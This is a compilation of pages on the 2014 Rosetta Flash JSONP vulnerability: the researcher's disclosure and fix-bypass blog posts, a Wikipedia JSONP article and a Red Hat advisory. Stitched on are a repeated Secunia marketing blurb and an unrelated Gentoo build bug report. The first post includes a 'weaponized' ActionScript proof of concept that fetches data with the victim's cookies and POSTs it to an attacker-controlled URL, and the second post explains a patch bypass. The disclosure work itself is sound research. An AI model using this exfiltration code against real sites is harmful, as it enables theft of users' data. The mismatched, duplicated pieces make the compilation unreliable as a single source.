# Abusing JSONP with Rosetta Flash

July 8, 2014

In this blog post I present **Rosetta Flash**, a tool for **converting any SWF file** to one composed of **only alphanumeric characters** in order to **abuse JSONP endpoints**, making a victim perform arbitrary requests to the domain with the vulnerable endpoint and **exfiltrate potentially sensitive data**, not limited to JSONP responses, to an attacker-controlled site. This is a **XSRF bypassing Same Origin Policy**.

![Rosetta Flash logo](https://static.miki.it/images/rosettaflash_logo_small.png)

High profile **Google** domains (`accounts.google.com`, `www.`, `books.`, `maps.`, etc.) and **YouTube** were vulnerable and have been recently fixed. **Twitter**, **LinkedIn**, **Yahoo!**, **eBay**, **Mail.ru**, **Flickr**, **Baidu**, **Instagram**, **Tumblr** and **Olark** still have vulnerable JSONP endpoints at the time of writing this blog post (but **Adobe pushed a fix in the latest Flash Player**, see [Mitigations and fix](#mitigations-and-fix)).

**Update 2014-08-12**: The original fix by Adobe was not enough ([CVE-2014-5333 (NIST)](https://nvd.nist.gov/vuln/detail/CVE-2014-5333)). After a month, Adobe released a [better fix for Rosetta Flash](https://blog.miki.it/2014/8/15/adobe-really-fixed-rosetta-flash-today/).

This is a *well known issue* in the infosec community, but so far no public tools for generating arbitrary *ASCII-only*, or, even better, *alphanum only*, valid SWF files have been presented. This led websites owners and even big players in the industry to postpone any mitigation until a credible proof of concept was provided.

So, that moment has come **:)** .

I will present this vulnerability at [Hack In The Box: Malaysia](https://conference.hitb.org/hitbsecconf2014kul/conference-speakers/) this October, and the Rosetta Flash technology will be featured in the next [PoC||GTFO](https://www.alchemistowl.org/pocorgtfo/) release.

A **CVE identifier** has been assigned: [CVE-2014-4671 (NIST)](https://nvd.nist.gov/vuln/detail/CVE-2014-4671).

### Paper and slides

If you prefer, you can discover the beauty of Rosetta by reading the [paper](https://static.miki.it/RosettaFlash/RosettaFlash_paper.pdf) or with a set of [comprehensive slides](https://static.miki.it/RosettaFlash/RosettaFlash.pdf).

### The attack scenario

To better understand the **attack scenario** it is important to take into account the combination of three factors:

1. With Flash, **a SWF file can perform cookie-carrying GET and POST requests to the domain that hosts it**, with no `crossdomain.xml` check. This is why allowing users to upload a SWF file on a sensitive domain is dangerous: by uploading a carefully crafted SWF, an attacker can make the victim perform requests that have side effects and exfiltrate sensitive data to an external, attacker-controlled, domain.
2. **JSONP**, by design, **allows an attacker to control the first bytes of the output** of an endpoint by specifying the `callback` parameter in the request URL. Since most JSONP callbacks **restrict the allowed charset** to `[a-zA-Z]`, `_` and `.`, my tool focuses on this very restrictive charset, but it is general enough to work with different user-specified allowed charsets.
3. SWF files can be **embedded** on an attacker-controlled domain using a Content-Type forcing `<object>` tag, and **will be executed as Flash** as long as the content looks like a valid Flash file.

Rosetta Flash leverages **zlib**, **Huffman encoding** and **ADLER32 checksum bruteforcing** to convert any SWF file to another one composed of only alphanumeric characters, so that it can be passed as a JSONP callback and then reflected by the endpoint, effectively hosting the Flash file on the vulnerable domain.

In the [Rosetta Flash GitHub repository](https://github.com/mikispag/rosettaflash) I provide ready-to-be-pasted, universal, weaponized **full featured proofs of concept** with ActionScript sources.

But how does Rosetta Flash really work?

### Details on Rosetta Flash

[![](https://static.miki.it/images/rosettaflash_convert.png)](https://static.miki.it/images/rosettaflash_convert.png)
Rosetta Flash takes in input an ordinary binary SWF and returns an equivalent one compressed with zlib such that it is composed of alphanumeric characters only

Rosetta Flash uses **ad-hoc Huffman encoders** in order to map non-allowed bytes to allowed ones. Naturally, since we are mapping a wider charset to a more restrictive one, this is not a real compression, but an inflation: we are effectively **using Huffman as a Rosetta stone**.

A Flash file can be either **uncompressed** (magic bytes `FWS`), **zlib-compressed** (magic bytes `CWS`) or **LZMA-compressed** (magic bytes `ZWS`).

[![](https://static.miki.it/images/rosettaflash_swfformat.png)](https://static.miki.it/images/rosettaflash_swfformat.png)
SWF header formats

Furthermore, **Flash parsers are very liberal**, and tend to **ignore invalid fields**. This is very good for us, because we can force it to the characters we prefer.

[![](https://static.miki.it/images/rosettaflash_liberal.png)](https://static.miki.it/images/rosettaflash_liberal.png)
Flash parsers are liberal

#### zlib header hacking

We need to make sure that the **first two bytes** of the zlib stream, which is basically a wrapper over DEFLATE, are OK.

Here is how I did that:

[![](https://static.miki.it/images/rosettaflash_zlib_1.png)](https://static.miki.it/images/rosettaflash_zlib_1.png)
Hacking the first byte of the zlib header

[![](https://static.miki.it/images/rosettaflash_zlib_2.png)](https://static.miki.it/images/rosettaflash_zlib_2.png)
Hacking the second byte of the zlib header

There aren’t many allowed two-bytes sequences for `CMF` (Compression Method and flags) + `CINFO` (malleable) + `FLG` (including a check bit for `CMF` and `FLG` that has to match, preset dictionary (not present), compression level (ignored)).

`0x68 0x43 = hC` is allowed and Rosetta Flash always uses this particular sequence.

#### ADLER32 checksum bruteforcing

As you can see from the SWF header format, the checksum is the trailing part of the zlib stream included in the compressed SWF in output, so it also needs to be alphanumeric. Rosetta Flash appends bytes in a *clever* way to get an **ADLER32 checksum** of the original uncompressed SWF that is made of just `[a-zA-Z0-9_\.]` characters.

An **ADLER32 checksum** is composed of two 4-bytes rolling sums, **S1** and **S2**, concatenated:

[![](https://static.miki.it/images/rosettaflash_adler32_1.png)](https://static.miki.it/images/rosettaflash_adler32_1.png)
ADLER32 checksum

For our purposes, both S1 and S2 must have a byte representation that is allowed (i.e., all alphanumeric). The question is: how to find an allowed checksum by manipulating the original uncompressed SWF? Luckily, the SWF file format allows to **append arbitrary bytes** at the end of the original SWF file: they are ignored. This is gold for us.

But what is a *clever* way to append bytes? I call my approach *Sleds + Deltas technique*:

[![](https://static.miki.it/images/rosettaflash_adler32_manipulation.png)](https://static.miki.it/images/rosettaflash_adler32_manipulation.png)
ADLER32 checksum manipulation

Basically, we can keep adding a high byte sled (of `fe`, because `ff` doesn’t play so nicely with the Huffman part we’ll roll out later) until there is a single byte we can add to make S1 modulo-overflow and become the minimum allowed byte representation, and then we add that delta.

Now we have a valid S1, and we want to keep it fixed. So we add a NULL bytes sled until S2 modulo-overflows, and we also get a valid S2.

#### Huffman magic

Once we have an uncompressed SWF with an alphanumeric checksum and a valid alphanumeric zlib header, it’s time to create dynamic Huffman codes that translate everything to `[a-zA-Z0-9_\.]` characters. This is currently done with a pretty raw but effective approach that has to be optimized in order to work effectively for larger files. Twist: also the representation of tables, to be embedded in the file, has to satisfy the same charset constraints.

[![](https://static.miki.it/images/rosettaflash_deflate.png)](https://static.miki.it/images/rosettaflash_deflate.png)
DEFLATE block format

We use two different hand-crafted Huffman encoders that make minimum effort in being efficient, but focus on byte alignment and offsets to get bytes to fall into the allowed charset. In order to reduce the inevitable inflation in size, repeat codes (code `16`, mapped to `00`) are used to produce shorter output which is still alphanumeric.

For more detail, feel free to browse the source code in the [Rosetta Flash GitHub repository](https://github.com/mikispag/rosettaflash).

Here is how the output file looks, bit-by-bit:

#### Wrapping up the output file

We now have everything we need:

[![](https://static.miki.it/images/rosettaflash_wrapping.png)](https://static.miki.it/images/rosettaflash_wrapping.png)
Success! Here is a completely alphanumeric SWF file!

Please enjoy an [alphanumeric rickroll](https://github.com/mikispag/rosettaflash/blob/master/PoC/rickroll-ascii.swf) (*might no longer work in latest Flash Player, see [Mitigations and fix](#mitigations-and-fix)*).

#### An universal, weaponized proof of concept

Here is an example written in ActionScript 2 (for the *mtasc* open source compiler, now replaced by [Haxe]]([https://haxe.org/))](https://haxe.org/%29%29):

```
class X {
    static var app : X;
    function X(mc) {
        if (_root.url) {
            var r:LoadVars = new LoadVars();
            r.onData = function(src:String) {
                if (_root.exfiltrate) {
                    var w:LoadVars = new LoadVars();
                    w.x = src;
                    w.sendAndLoad(_root.exfiltrate, w, "POST");
                }
            }
            r.load(_root.url, r, "GET");
        }
    }
    // entry point
    static function main(mc) {
        app = new X(mc);
    }
}

```

We compile it to an uncompressed SWF file, and feed it to Rosetta Flash.

The alphanumeric output (wrapped, remove *newlines*) is:

This universal proof of concept accepts two parameters passed as FlashVars:

* `url` â the **URL in the same domain** of the vulnerable endpoint to which **perform a GET request with the victim’s cookie**.
* `exfiltrate` â the **attacker-controlled URL** to which **POST** a `x` variable with the **exfiltrated data**.

### Mitigations and fix

#### Mitigations by Adobe

Due to the sensitivity of this vulnerability, I first disclosed it internally in **Google**, and then privately to **Adobe PSIRT**. A few days before releasing the code and publishing this blog post, I also notified Twitter, eBay, Tumblr and Instagram.

**Adobe** confirmed they **pushed a tentative fix** in Flash Player 14 beta codename Lombard (version 14.0.0.125, [release notes](https://labsdownload.adobe.com/pub/labs/flashruntimes/shared/air14_flashplayer14_releasenotes.pdf)) and **finalized the fix in today’s release** (version 14.0.0.145, released on July 8, 2014).

In the [security bulletin APSB14-17](https://helpx.adobe.com/security/products/flash-player/apsb14-17.html), Adobe mentions a stricter verification of the SWF file format:

These updates include additional validation checks to ensure that Flash Player rejects malicious content from vulnerable JSONP callback APIs (CVE-2014-4671).

Adobe released a [better fix](https://blog.miki.it/2014/8/15/adobe-really-fixed-rosetta-flash-today/) on August 12, 2014, an [even better one](https://helpx.adobe.com/security/products/flash-player/apsb15-11.html) on June 09, 2015 and finally a [probably-good-for-real one](https://helpx.adobe.com/security/products/flash-player/apsb15-23.html) on September 21, 2015.

#### Mitigations by website owners

First of all, it is important to **avoid using JSONP on sensitive domains**, and if possible **use a dedicated sandbox domain**.

A mitigation is to make endpoints return the **HTTP header** `Content-Disposition: attachment; filename=f.txt`, forcing a file download. This is enough for instructing Flash Player not to run the SWF starting from Adobe Flash 10.2.

To be also protected from content sniffing attacks, **prepend the reflected callback** with `/**/`. This is exactly what Google, Facebook and GitHub are currently doing.

Furthermore, to hinder this attack vector in most modern browsers you can also **return the HTTP header** `X-Content-Type-Options: nosniff`. If the JSONP endpoint returns a Content-Type which is not `application/x-shockwave-flash` (usually `application/javascript` or `application/json`), Flash Player will *refuse* to execute the SWF.

### Acknowledgment and impact

Thanks to [GÃ¡bor MolnÃ¡r](https://twitter.com/molnar_g), who worked on [ascii-zip](https://github.com/molnarg/ascii-zip), source of inspiration for the Huffman part of Rosetta. I learn talking with him in private that we worked independently on the same problem. He privately came up with a single instance of an ASCII SWF approximately one month before I finished the whole Rosetta Flash internally at Google in May and reported it to HackerOne only.

To protect themselves, most JSONP endpoints on the web now modified their response to prefix something, such as an empty JS comment. Several frameworks ([Ruby on Rails](https://github.com/rails/rails/pull/16109), [Rack](https://github.com/rack/rack-contrib/pull/93), [Symfony](https://github.com/symfony/symfony/pull/11367), [Express.js](https://github.com/strongloop/express/commit/f684a64df71a08c0caf2371aa305411df690a10f), [Node.js](https://github.com/node-modules/jsonp-body/blob/7d4582d5ed10d96d616015dc21fe55d81e0b3508/index.js#L46), [hapi.js](https://github.com/hapijs/hapi/pull/1766), [Scalatra](https://github.com/scalatra/scalatra/pull/409), [see all Rosetta Flash-related code on GitHub](https://github.com/search?q=%22rosetta+flash%22&type=Code&utf8=%E2%9C%93)…) patched their JSONP logic. Rapid7 incorporated the exfiltrating PoC in an [official Metasploit module](https://www.rapid7.com/db/modules/auxiliary/gather/flash_rosetta_jsonp_url_disclosure). The [Wikipedia page for JSONP](https://en.wikipedia.org/wiki/JSONP#Rosetta_Flash) has a Rosetta Flash paragraph. Three CVEs have been assigned: [CVE-2014-4671](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-4671) for the vulnerability itself and [CVE-2014-5333](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-5333) + [CVE-2015-3096](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3096) + [CVE-2015-5571](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-5571) for mitigation bypasses (one authored by me, the rest by [TomÃ¡Å¡ PoleÅ¡ovskÃ½](https://topolik-at-work.blogspot.com/2015/06/cve-2015-3096-rosetta-flash-fix-bypass.html) and Ben Hayak.

Presented at major conferences ([HITB](https://conference.hitb.org/hitbsecconf2014kul/sessions/abusing-jsonp-with-rosetta-flash/), [OWASP AppSec](https://2015.appsec.eu/talks/)), it won an [Internet Bug Bounty](https://hackerone.com/flash), was [nominated for a Pwnie Award](https://pwnies.com/archive/2014/nominations/) and appears in [Whitesec Top vulnerabilities of 2014](https://blog.whitehatsec.com/top-10-web-hacking-techniques-of-2014/).

From Wikipedia, the free encyclopedia

JavaScript technique for loading data

**JSONP**, or **JSON-P** (JSON with Padding), is a historical [JavaScript](/wiki/JavaScript "JavaScript") technique for requesting data by loading a `<script>` element,[[1]](#cite_note-JSON-P-1) which is an element intended to load ordinary JavaScript. It was proposed by Bob Ippolito in 2005.[[2]](#cite_note-2) JSONP enables sharing of data bypassing same-origin policy, which disallows running JavaScript code to read media [DOM](/wiki/Document_Object_Model "Document Object Model") elements or [XMLHttpRequest](/wiki/XMLHttpRequest "XMLHttpRequest") data fetched from outside the page's originating site. The originating site is indicated by a combination of [URI scheme](/wiki/URI_scheme "URI scheme"), [hostname](/wiki/Hostname "Hostname"), and [port number](/wiki/Port_number "Port number").

JSONP is vulnerable to the data source replacing the innocuous function call with malicious code, which is why it has been superseded by cross-origin resource sharing (available since 2009[[3]](#cite_note-caniuse-cors-3)) in modern applications.

## Functionality

[[edit](/w/index.php?title=JSONP&action=edit&section=1 "Edit section: Functionality")]

The HTML `<script>` element is generally allowed to execute JavaScript code retrieved from foreign origins. Services replying with pure [JSON](/wiki/JSON "JSON") data, however, were not able to share data from foreign origins before the adoption of CORS ([Cross-origin resource sharing](/wiki/Cross-origin_resource_sharing "Cross-origin resource sharing")).

For example, a request to a foreign service `http://server.example.com/Users/1234` may return a record for a person named Clem in the JSON format. JSON syntax is consistent with JavaScript's object syntax.

```
{
    "Name": "Clem",
    "Id": 1234,
    "Rank": 7
}

```

Without support for CORS, an attempt to use the data across domains results in a JavaScript error.

```
<script type="application/javascript"
        src="http://server.example.com/Users/1234">
</script>

```

The browser will download the `<script>` file, evaluate its contents, misinterpret the raw JSON data as a block, and throw a syntax error. Even if the data were interpreted as a JavaScript object literal, it could not be accessed by JavaScript running in the browser, since without a variable assignment, object literals are inaccessible.

In the JSONP usage pattern, the URL request pointed to by the `src` attribute in the `<script>` element returns JSON data, with JavaScript code (usually a function call) wrapped around it. This "wrapped payload" is then interpreted by the browser. In this way, a function that is already defined in the JavaScript environment can manipulate the JSON data. A typical JSONP request and response are shown below.

The function call to parseResponse() is the "P" of JSONP—the "padding" or "prefix" around the pure JSON.[[4]](#cite_note-4) For JSONP to work, a server must reply with a response that includes the JSONP function. JSONP does not work with JSON-formatted results. The JSONP function invocation that gets sent back, and the payload that the function receives, must be agreed upon by the client and server. By convention, the server providing the JSON data offers the requesting website to name the JSONP function, typically using the name jsonp or [callback](/wiki/Callback_%28computer_programming%29 "Callback (computer programming)") as the named query-string parameter, in its request to the server: `<script src="http://server.example.com/Users/1234?callback=parseResponse"></script>`.

In this example, the received payload would be:

```
parseResponse({"Name": "Clem", "Id": 1234, "Rank": 7});

```

## Script element injection

[[edit](/w/index.php?title=JSONP&action=edit&section=2 "Edit section: Script element injection")]

JSONP makes sense only when used with a script element. For each new JSONP request, the browser must add a new `<script>` element, or reuse an existing one. The former option—adding a new script element—is done via dynamic DOM manipulation, and is known as *script element injection*. The `<script>` element is injected into the HTML DOM, with the URL of the desired JSONP endpoint set as the "src" attribute. This dynamic *script element injection* is usually done by a JavaScript helper library. [jQuery](/wiki/JQuery "JQuery") and other frameworks have JSONP helper functions; there are also standalone options.

An example of using jQuery to *dynamically inject* script element for a JSONP call looks like this:

```
$.getScript("http://server.example.com/Users/192.168.73.96?callback=parseResponse");

```

After the element is injected, the browser evaluates the element, and performs an HTTP GET on the src URL, retrieving the content. Then the browser evaluates the return payload as JavaScript. This is typically a function invocation. In that way, the use of JSONP can allow browser pages to work around the [same-origin policy](/wiki/Same-origin_policy "Same-origin policy") via script element injection.[[5]](#cite_note-5)

The script runs within the scope of the including page and, as such, is still subject to cross-domain restrictions relative to the domain of the including page. This means that a web page cannot, for example, load a library hosted on another site via JSONP and then make XMLHttpRequest requests to that site (unless [cross-origin resource sharing](/wiki/Cross-origin_resource_sharing "Cross-origin resource sharing") (CORS) is supported), although one could use such a library to make XMLHttpRequests to one's own site.

## Security concerns

[[edit](/w/index.php?title=JSONP&action=edit&section=3 "Edit section: Security concerns")]
### Untrusted third-party code

[[edit](/w/index.php?title=JSONP&action=edit&section=4 "Edit section: Untrusted third-party code")]

Including script elements from remote servers allows the remote servers to inject *any* content into a website. If the remote servers have vulnerabilities that allow JavaScript injection, the page served from the original server is exposed to an increased risk. If an attacker can inject any JavaScript into the original web page, then that code can retrieve additional JavaScript from any domain, bypassing the [same-origin policy](/wiki/Same-origin_policy "Same-origin policy").[[6]](#cite_note-6) The Content Security Policy HTTP Header lets web sites tell web browsers which domain scripts may be included from.

An effort was undertaken around 2011 to define a safer strict subset definition for JSONP[[1]](#cite_note-JSON-P-1) that browsers would be able to enforce on script requests with a specific [MIME](/wiki/MIME "MIME") type such as "application/json-p". If the response did not parse as strict JSONP, the browser could throw an error or just ignore the entire response. However, this approach was abandoned in favor of [CORS](/wiki/Cross-origin_resource_sharing "Cross-origin resource sharing"), and the correct MIME type for JSONP remains `application/javascript`.[[7]](#cite_note-7)

### Whitespace differences

[[edit](/w/index.php?title=JSONP&action=edit&section=5 "Edit section: Whitespace differences")]

JSONP carried the same problems as resolving JSON with `eval()`: both interpret the JSON text as JavaScript, which meant differences in handling U+2028 ([Line Separator](/wiki/Newline#Unicode "Newline")) and U+2029 ([Paragraph Separator](/wiki/Newline#Unicode "Newline")) from JSON proper. This made some JSON strings non-legal in JSONP; servers serving JSONP had to escape these characters prior to transmission.[[8]](#cite_note-Magnus_Holm-8) This issue has now been rectified in ES2019.[[9]](#cite_note-9)

### Callback name manipulation and reflected file download attack

[[edit](/w/index.php?title=JSONP&action=edit&section=6 "Edit section: Callback name manipulation and reflected file download attack")]

Unsanitized callback names may be used to pass malicious data to clients, bypassing the restrictions associated with `application/json` content type, as demonstrated in reflected file download (RFD) attack from 2014.[[10]](#cite_note-10)

Insecure JSONP endpoints can be also injected with malicious data.[[11]](#cite_note-11)

### Cross-site request forgery

[[edit](/w/index.php?title=JSONP&action=edit&section=7 "Edit section: Cross-site request forgery")]

Naive deployments of JSONP are subject to [cross-site request forgery](/wiki/Cross-site_request_forgery "Cross-site request forgery") (CSRF or XSRF) attacks.[[12]](#cite_note-12) Because the HTML `<script>` element does not respect the [same-origin policy](/wiki/Same-origin_policy "Same-origin policy") in web browser implementations, a malicious page can request and obtain JSON data belonging to another site. This will allow the JSON-encoded data to be evaluated in the context of the malicious page, possibly divulging passwords or other sensitive data if the user is currently logged into the other site.

### Rosetta Flash

[[edit](/w/index.php?title=JSONP&action=edit&section=8 "Edit section: Rosetta Flash")]

Rosetta Flash is an exploitation technique that allows an attacker to exploit servers with a vulnerable JSONP endpoint by causing [Adobe Flash Player](/wiki/Adobe_Flash_Player "Adobe Flash Player") to believe that an attacker-specified Flash applet originated on the vulnerable server. Flash Player implements [same-origin policy](/wiki/Same-origin_policy "Same-origin policy") allowing one to make requests (with cookies) and receive responses from the hosting site. The applet can then send the retrieved data back to the attacker. This is a cross-origin exploit with an impact similar to embedding an arbitrary Flash applet in the vulnerable domain. The exploit uses an ActionScript payload compiled to an SWF file composed entirely of alphanumeric characters by crafting a [zlib](/wiki/Zlib "Zlib") stream with a particular header and [DEFLATE](/wiki/DEFLATE "DEFLATE") blocks with ad-hoc [Huffman coding](/wiki/Huffman_coding "Huffman coding"). The resulting alphanumeric-only SWF file is then used as the callback parameter of a JSONP call. High-profile sites such as Google, YouTube, Twitter, Yahoo!, Yandex, LinkedIn, eBay, GitHub, Instagram, and Tumblr were all vulnerable until July 2014.[[13]](#cite_note-13) This vulnerability was initially discovered by Erling and Alok Menghrajani, with a public presentation at a security conference. The exploitation of the vulnerability was subsequently improved by Gábor Molnár. Google security engineer [Michele Spagnuolo](/w/index.php?title=Michele_Spagnuolo&action=edit&redlink=1 "Michele Spagnuolo (page does not exist)") coined the term[[14]](#cite_note-14) and has [CVE](/wiki/CVE_%28identifier%29 "CVE (identifier)")-[2014-4671](https://nvd.nist.gov/vuln/detail/CVE-2014-4671)[[15]](#cite_note-15) and CVE-[2014-5333](https://nvd.nist.gov/vuln/detail/CVE-2014-5333).[[16]](#cite_note-16) Adobe Flash Player release version 14.0.0.145, released on 8 July 2014, introduced stronger validation of Flash files,[[17]](#cite_note-17) and in version 14.0.0.176, released on 12 August 2014, finalized the fix,[[18]](#cite_note-18) preventing this exploit from working.

Prior to Adobe's fix, websites could protect themselves by prepending an empty JavaScript comment (/\*\*/) or even just a newline as the first bytes of the JSONP response.

## History

[[edit](/w/index.php?title=JSONP&action=edit&section=9 "Edit section: History")]

In July 2005, George Jempty suggested an optional variable assignment be prepended to JSON.[[19]](#cite_note-19)[[20]](#cite_note-20) The original proposal for JSONP, where the padding is a callback function, appears to have been made by Bob Ippolito in December 2005[[21]](#cite_note-21) and is now used by many [Web 2.0](/wiki/Web_2.0 "Web 2.0") applications such as [Dojo Toolkit](/wiki/Dojo_Toolkit "Dojo Toolkit") and [Google Web Toolkit](/wiki/Google_Web_Toolkit "Google Web Toolkit").

## Topic

An updated Adobe Flash Player package that fixes three security issues is
now available for Red Hat Enterprise Linux 5 and 6 Supplementary.

The Red Hat Security Response Team has rated this update as having Critical
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

The flash-plugin package contains a Mozilla Firefox compatible Adobe Flash
Player web browser plug-in.

This update fixes multiple vulnerabilities in Adobe Flash Player. These
vulnerabilities are detailed in the Adobe Security Bulletin APSB14-17,
listed in the References section.

Multiple flaws were found in the way flash-plugin displayed certain SWF
content. An attacker could use these flaws to create a specially crafted
SWF file that would cause flash-plugin to crash or, potentially, execute
arbitrary code when the victim loaded a page containing the malicious SWF
content. (CVE-2014-0537, CVE-2014-0539)

This update also fixes a flaw that would lead to Cross-Site Request Forgery
(CSRF) attacks. (CVE-2014-4671)

All users of Adobe Flash Player should install this updated package, which
upgrades Flash Player to version 11.2.202.394.

# Adobe fixed Rosetta Flash today

August 15, 2014

**Adobe** pushed a tentative fix for Rosetta Flash in **Flash Player 14 beta codename Lombard** (version 14.0.0.125, [release notes](https://labsdownload.adobe.com/pub/labs/flashruntimes/shared/air14_flashplayer14_releasenotes.pdf)) and finalized the fix in the next release, version **14.0.0.145**, on July 8, 2014.

In the [security bulletin APSB14-17](https://helpx.adobe.com/security/products/flash-player/apsb14-17.html), Adobe mentions a stricter verification of the SWF file format:

These updates include additional validation checks to ensure that Flash Player rejects malicious content from vulnerable JSONP callback APIs (CVE-2014-4671).

What I quickly found out after reversing the patch is that **the fix was not good enough**.

### The old 14.0.0.145 fix

[![](https://static.miki.it/images/rosettaflash_patch.png)](https://static.miki.it/images/rosettaflash_patch.png)
Reversing the 14.0.0.145 patch

What Flash Player used to do in order to disrupt *Rosetta Flash-like* attacks was:

1. Check the **first 8 bytes** of the file. If there is at least one JSONP-disallowed character, then the SWF is considered **safe** and no further check is performed.
2. Flash will then check the **next 4096 bytes**. If there is at least one JSONP-disallowed character, the file is considered **safe**.
3. Otherwise the file is considered **unsafe** and is **not executed**.

#### First problem: JSONP whitelist too broad

The JSONP-disallowed list was `[^0-9A-Za-z\._]` and was **too broad**. For instance, they were considering the `$` character as disallowed in a JSONP callback, which is often not true, because of jQuery and other fancy JS libraries.

This means that if you add `$` to the `ALLOWED_CHARSET` in Rosetta Flash, and the JSONP endpoint allows the dollar sign in the callback (they almost always do), you **bypass the fix**.

#### Second problem: we control the ADLER32 checksum!

[![](https://static.miki.it/images/rosettaflash_wrapping.png)](https://static.miki.it/images/rosettaflash_wrapping.png)
Structure of a Rosetta Flash-generated SWF file

A Rosetta Flash-generated SWF file ends with **four bytes** that are the **manipulated ADLER32 checksum** of the original, uncompressed SWF. A motivated attacker can use the last four malleable bytes to **match something already naturally returned by the JSONP endpoint after the padding**.

An example that always works is the **one character right after the reflected callback**: an open parenthesis: `(`.

So, if we make the last byte of the checksum a `(`, and the rest of the SWF is alphanumeric, **we can pass as a callback the file except the last byte**, and **we will have a response with a full valid SWF that bypasses the check by Adobe** (because `(` is disallowed in callbacks).

We are lucky: the last byte of the checksum is the **least significant** of **S1**, a partial sum, and **it is trivial to force it** to `(` with our *Sled + Delta* bruteforcing technique.

Here is a **valid alphanum Flash file that ends with an open parenthesis** and that we could pass, trimming the last character, as a JSONP callback (wrapped, remove *newlines*):

This issue has [CVE-2014-5333](https://nvd.nist.gov/vuln/detail/CVE-2014-5333).

### The new fix in 14.0.0.176

I reported the bypass to Adobe as soon as I discovered it, a few days after my writeup was published. We worked together for coming up with a complete fix.

The new version, released on August 12 2014, does the following checks in sequence:

1. Look for `Content-Type: application/x-shockwave-flash` header. If found, return **OK**.
2. Scan the **first 8 bytes** of the file. If any byte is >= `0x80` (non-ASCII), return **OK**.
3. Scan the rest of the SWF, and at maximum 4096 bytes. If any byte is >= `0x80`, return **OK**.
4. **The SWF is invalid, do not execute it**.

In the [security bulletin APSB14-18](https://helpx.adobe.com/security/products/flash-player/apsb14-18.html), Adobe mentions the new validation:

These updates include a new validation check to handle specially crafted SWF content that can bypass restrictions introduced in version 14.0.0.145. The new restrictions in 14.0.0.176 prevent Flash Player from being used for cross-site request forgery attacks on JSONP endpoints (CVE-2014-5333).

I believe this is finally enough.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

| [Description](#c0)  Tobias Minich    2004-05-21 10:31:11 UTC  ``` When I tried to emerge xd3d-8.2.1 it didn't install anyting useful. Looking closer at it several errors occur during the build, but the emerge seems to fail to notice it. Looking even closer I noticed that it needs g77, but gcc-3.3.3 now defaults to build without it. I have no idea how to clean this up, but the ebuild merging without error under these contitions is certainly not the right behaviour =) ```  [Comment 1](#c1)  Thomas Veith (RETIRED)   gentoo-dev  2004-05-24 14:57:42 UTC  ``` > but the ebuild merging without error under these contitions is certainly not the right behaviour =)  It certainly isn't :-).. Sorry for the inconvenience, fixed in portage now so that the ebuild fails when g77 isn't present. ``` |  |
